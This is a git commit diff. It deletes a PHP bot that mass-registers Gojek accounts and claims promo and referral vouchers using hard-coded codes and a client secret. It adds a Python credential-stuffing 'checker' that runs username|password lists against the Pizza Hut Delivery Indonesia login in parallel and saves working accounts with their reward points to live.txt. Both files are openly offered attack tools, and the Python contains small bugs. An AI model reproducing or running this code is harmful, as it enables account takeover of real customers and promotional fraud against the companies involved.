abc809682e307bee42b105ccba5de13609c4d331
bananacreamy <61799934+bananacreamy@users.noreply.github.com>
2020-05-02 16:26:56 +0700

    Update x.py

--- x.py
+++ x.py
@@ -1,148 +1,95 @@
-<?php
-date_default_timezone_set('Asia/Jakarta');
-include "function.php";
-echo color("green","# # # # # # # # # # # # # # # # # # # # # # # \n");
-echo color("yellow","[•]  Time  : ".date('[d-m-Y] [H:i:s]')."   \n");
-echo color("yellow","[•]              waiting proses.....           \n");
-echo color("yellow","[•] cara menulis nomor pakai 62xxxxxxxxxx \n");
-echo color("green","# # # # # # # # # # # # # # # # # # # # # # # \n");
-function change(){
-        $nama = nama();
-        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
-        ulang:
-        echo color("nevy","(•) Nomor : ");
-        $no = trim(fgets(STDIN));
-        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$no.'","signed_up_country":"ID"}';
-        $register = request("/v5/customers", null, $data);
-        if(strpos($register, '"otp_token"')){
-        $otptoken = getStr('"otp_token":"','"',$register);
-        echo color("green","+] Kode verifikasi sudah di kirim")."\n";
-        otp:
-        echo color("nevy","?] Otp: ");
-        $otp = trim(fgets(STDIN));
-        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
-        $verif = request("/v5/customers/phone/verify", null, $data1);
-        if(strpos($verif, '"access_token"')){
-        echo color("green","+] Berhasil mendaftar");
-        $token = getStr('"access_token":"','"',$verif);
-        $uuid = getStr('"resource_owner_id":',',',$verif);
-        echo "\n".color("yellow","+] Your access token : ".$token."\n\n");
-        save("token.txt",$token);
-        echo "\n".color("nevy","?] Mau Redeem Voucher?: y/n ");
-        $pilihan = trim(fgets(STDIN));
-        if($pilihan == "y" || $pilihan == "Y"){
-        echo color("red","===========(REDEEM VOUCHER)===========");
-        echo "\n".color("yellow","!] Claim voc GORIDE 8K");
-        echo "\n".color("yellow","!] Please wait");
-        for($a=1;$a<=3;$a++){
-        echo color("yellow",".");
-        sleep(3);
-        }
-        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGORIDEPAY"}');
-        $message = fetch_value($code1,'"message":"','"');
-        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
-        echo "\n".color("green","+] Message: ".$message);
-        goto gocar;
-        }else{
-        echo "\n".color("red","-] Message: ".$message);
-        gocar:
-        echo "\n".color("yellow","!] Claim voc GOFOOD 15+10+5");
-        echo "\n".color("yellow","!] Please wait");
-        for($a=1;$a<=3;$a++){
-        echo color("yellow",".");
-        sleep(20);
-        }
-        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD090320A"}');
-        $message = fetch_value($code1,'"message":"','"');
-        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
-        echo "\n".color("green","+] Message: ".$message);
-        goto gofood;
-        }else{
-        echo "\n".color("red","-] Message: ".$message);
-        reff:
-        $data = '{"referral_code":"G-75SR565"}';    
-        $claim = request("/customer_referrals/v1/campaign/enrolment", $token, $data);
-        $message = fetch_value($claim,'"message":"','"');
-        if(strpos($claim, 'Promo kamu sudah bisa dipakai')){
-        echo "\n".color("green","+] Message: ".$message);
-        goto gofood;
-        }else{
-        echo "\n".color("red","-] Message: ".$message);
-        }
-        gofood:
-        echo "\n".color("yellow","!] Claim voc GOCAR pot 14K");
-        echo "\n".color("yellow","!] Please wait");
-        for($a=1;$a<=3;$a++){
-        echo color("yellow",".");
-        sleep(3);
-        }
-        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOCAR14"}');
-        $message = fetch_value($code1,'"message":"','"');
-        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
-        echo "\n".color("green","+] Message: ".$message);
-        sleep(1);
-        sleep(3);
-        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
-        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
-        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
-        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
-        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
-        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
-        $voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
-        $voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
-        echo "\n".color("yellow","!] Total voucher ".$total." : ");
-        echo color("green","1. ".$voucher1);
-        echo "\n".color("green","                     2. ".$voucher2);
-        echo "\n".color("green","                     3. ".$voucher3);
-        echo "\n".color("green","                     4. ".$voucher4);
-        echo "\n".color("green","                     5. ".$voucher5);
-        echo "\n".color("green","                     6. ".$voucher6);
-        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
-        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
-        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
-        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
-        $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
-        $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
-         setpin:
-         echo "\n".color("nevy","?] Mau set pin?: y/n ");
-         $pilih1 = trim(fgets(STDIN));
-         if($pilih1 == "y" || $pilih1 == "Y"){
-         //if($pilih1 == "y" && strpos($no, "628")){
-         echo color("red","========( PIN ANDA = KEPO DEHH.... )========")."\n";
-         $data2 = '{"pin":"192211"}';
-         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
-         echo "Otp set pin: ";
-         $otpsetpin = trim(fgets(STDIN));
-         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
-         echo $verifotpsetpin;
-         }else if($pilih1 == "n" || $pilih1 == "N"){
-         die();
-         }else{
-         echo color("red","-] GAGAL!!!\n");
-         }
-         }
-         }
-         }
-         }else{
-         goto setpin;
-         }
-         }else{
-         echo color("red","-] Otp yang anda input salah");
-         echo"\n==================================\n\n";
-         echo color("yellow","!] Silahkan input kembali\n");
-         goto otp;
-         }
-         }else{
-         echo color("red","NOMOR SUDAH TERDAFTAR/SALAH !!!");
-         echo "\nMau ulang? (y/n): ";
-         $pilih = trim(fgets(STDIN));
-         if($pilih == "y" || $pilih == "Y"){
-         echo "\n==============Register==============\n";
-         goto ulang;
-         }else{
-         echo "\n==============Register==============\n";
-         goto ulang;
-  }
- }
-}
-echo change()."\n"; ?>
+import re
+import sys
+import request
+from concurrent.futures import ThreadPoolExecutor
+
+print("""\033[1m
+    ____  __    ____ 
+   / __ \/ /_  / __ \  | PhD Checker
+  / /_/ / __ \/ / / /  | Pizza hut delivery checker
+ / ____/ / / / /_/ /   | Coded by BANANACREAMY - \033[31;2mIndo\033[39;2mSec\033[0;1m
+/_/   /_/ /_/_____/    | Format? input manual\033[0m
+""")
+
+
+def worker(usr, pwd):
+    s = requests.Session()
+
+    token = s.get("https://www.phd.co.id/id/users/login/1").text
+    token = re.findall(r"name=\"my_token\" value=\"(.*?)\"", token)[0]
+
+    data = {
+        'return_url': 'https://www.phd.co.id/id/users/welcome',
+        'my_token': token,
+        'username': usr,
+        'password': pwd,
+        'remember': '1'
+    }
+
+    login = s.post("https://www.phd.co.id/id/users/login/1", data=data).text
+    point = s.get("https://www.phd.co.id/id/accounts").text
+    point = re.findall(r"<li class=\"owner-poin\">(.*?)</li>", point)
+    return usr, pwd, point
+
+
+def main():
+	file = sys.argv[1]
+	
+	if sys.argv != [2]:
+		wkr = 20
+	else:
+		wkr = int(sys.argv[2])
+		
+	try:
+		list = open(file)
+	except FileNotFoundError:
+		print("File not found!")
+		sys.exit()
+	jml = 0
+	no = 0
+	err = 0
+	live = 0
+	die = 0
+	for x in list.readlines():
+		jml += 1
+	list.seek(0)
+	print(f"Loaded {jml} accounts from {file}")
+	format = input("Format : ")
+	print()
+	
+	with ThreadPoolExecutor(max_workers=wkr) as e:
+		futures = []
+		for data in list.readlines():
+			data = data.strip().split(format)
+			if not data or len(data) != 2:
+				err += 1
+				continue
+			usr, pwd = data
+			futures.append(e.submit(worker, usr, pwd))
+		for i, future in enumerate(futures):
+			usr, pwd, point = future.result()
+			no = i+1
+			if not point:
+				die += 1
+				print(
+				    f"[{no}] \033[1m[\033[31mDIE\033[0;1m] {usr}|{pwd}\033[0m")
+                    
+			else:
+				live += 1
+				print(
+				f"[{no}] \033[1m[\033[32mLIVE\033[0;1m] {usr}|{pwd} {point[0]}\033[0m"
+				)
+				with open("live.txt","a") as file:
+					file.write(f"{usr}|{pwd}|{point[0]}\n")
+				file.close()
+                
+		print(f"\nLive {live}, Die {die}, Eror {err}\nSaved in live.txt")
+
+if __name__ == '__main__':
+	if len(sys.argv) != 3:
+		print(f"usage: python {sys.argv[0]} <list.txt> <worker>")
+		sys.exit()
+	try:
+		main()
+	except KeyboardInterrupt:
+		sys.exit()
